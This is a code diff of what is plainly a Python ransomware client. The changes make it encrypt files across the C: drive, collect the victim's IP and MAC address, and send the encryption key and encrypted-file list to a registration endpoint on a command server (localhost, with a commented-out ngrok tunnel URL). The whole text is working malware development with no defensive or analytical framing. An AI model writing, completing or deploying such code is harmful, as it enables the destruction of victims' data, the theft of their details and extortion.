@@ -6,11 +6,17 @@ from gege import gege
 import requests
 import socket
 from encrypter import Encrypter, KeyGenerator
+import re
+import uuid as uid
 
 
 def get_ip_address():
     hostname = socket.gethostname()
     return socket.gethostbyname(hostname)
+
+
+def get_mac_address():
+    return ':'.join(re.findall('..', '%012x' % uid.getnode()))
 
 
 def help_text(uuid : str):
@@ -39,16 +45,23 @@ def generate_image():
 
 def main():
     encryption_key = KeyGenerator().generateKey()
+    crypter = Encrypter(encryption_key)
 
+    path = "C://"
+    excludeExtensions = (".ini")
+    encrypted_files = crypter.encrypt(path, excludeExtensions)
 
     # ============================================================================= #
     base_api_url = "http://127.0.0.1:8000"
+    # base_api_url = "https://b381-2a02-8440-2302-a415-7a9f-acd8-67fe-d31b.eu.ngrok.io"
     url = base_api_url + "/register"
     ip_address = get_ip_address()
+    mac_address = get_mac_address()
     data = {
         'ip': ip_address,
-        'encryptionKey': encryption_key,
-        'infectedFiles': 18
+        'macAddress': mac_address,
+        'encryptionKey': str(encryption_key),
+        'encryptedFiles': encrypted_files
     }
     response = requests.post(url = url, json = data)
     uuid = response.json()
